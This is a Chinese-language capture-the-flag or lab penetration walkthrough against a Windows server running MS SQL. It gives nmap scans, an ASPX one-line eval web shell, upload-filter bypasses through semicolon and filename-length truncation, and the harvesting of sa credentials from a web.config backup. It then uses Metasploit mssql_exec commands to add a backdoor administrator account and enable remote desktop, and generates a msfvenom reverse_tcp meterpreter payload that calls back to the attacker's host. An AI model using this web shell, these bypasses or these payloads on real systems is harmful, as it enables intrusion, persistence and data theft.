***上路***

**1、端口收集**  

使用nmap扫描的时候，直接nmap -A 192.168.199.249发现只能扫出一个1433端口。  
因为Windows一下只能扫出1-10000端口，而使用nmap -p1-65535 -A 192.168.199.249也不行，因为nmap如果扫描的端口过多流量就会过大，可能会漏掉一些端口  
所以，使用：

nmap -p 1-10000 -A 192.168.199.249  
nmap -p 10001-20000 -A 192.168.199.249  

以此类推来进行扫描端口。  

一共扫出了两个端口：1433、27689  
1433对应的服务是ms sql，另一个未知。

**4、文件上传**

这里我写的一句话是  
<%@Page Language="Jscript"%><%eval(Request.Item\["chopper"\],"unsafe");%>  
保存为shell.jpg，上传

![](../Images/59b794cd74fe078db2a5a1ca80311d22.png)

这里要用到的是 ; 截断绕过

![](../Images/774cd9f49221462636814b785e1a6c7f.png)

然后在后台发现上传的文件中查看到上传的文件名是由随机的时间和自己上传的文件名结合而成的。  
还有文件上传的提示，文件名不能超过32位

![](../Images/eb05b5b76d05fc18dbabfdc1ca022f59.png)

这里出现了一个溢出漏洞，只能识别32位，我们可以让他超过32位，就是加上随机生成的，比如自动生成13位，我们可以~~(13位)~~(14位).aspx.txt  
所以可以利用文件名长度的限制，用burp来进行截断。

![](../Images/e9628efdf8007977d52be8f6ece97bdf.png)

前面上传发了一个错误的请求，直接爆出了上传文件的真实路径。/upfile/affix/

![](../Images/ca94d2c0bf0663fcdac229290324f63b.png)

菜刀连接：

![](../Images/21e641a6838d54ef9b2b54c97d3098a5.png)![](../Images/79e3fd47317b45d1bc818eeae5b50bf0.png)

在web.config.bak\_2017-1中发现了mssql中的sa用户和密码。  

**5、寻找key值**

打开msf使用

use auxiliary/admin/mssql/mssql\_exec模块

![](../Images/65eb26a34317ee59863e54a7f20ab42f.png)

设置cmd、rhosts、username、password  
可以修改cmd中的命令

![](../Images/f6d3c35993fbeed304c37f0f47505bea.png)

可以通过设置cmd中的命令来新建一个用户，并设置密码，把此用户加入到administrators这个用户组中。

set cmd net user liu /add（添加liu这个用户）

set cmd net user liu 123（设置liu这个用户的密码为123）

set cmd net localgroup administrators liu /add（把liu这个用户添加到administrators这个用户组中）

set cmd wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1（开启3389端口）

![](../Images/b0884619ddf0d8fad3bc96644ea3e737.png)

远程桌面连接后找到key值

![](../Images/b22cae194543fdeae625887a3b07bf3d.png)

第二种方法是使用msf生成木马进行监听然后拿到shell  
先生成木马：  
msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.199.213 lport=8888 -f exe -o uu.exe

![](../Images/9235d833038dfb71a780f2f876590912.png)

然后菜刀上传，通过搜索key文件：search -f \*.txt -d C:/

![](../Images/3c8f33b9c97b761ebffc13cc5116cd1c.png)
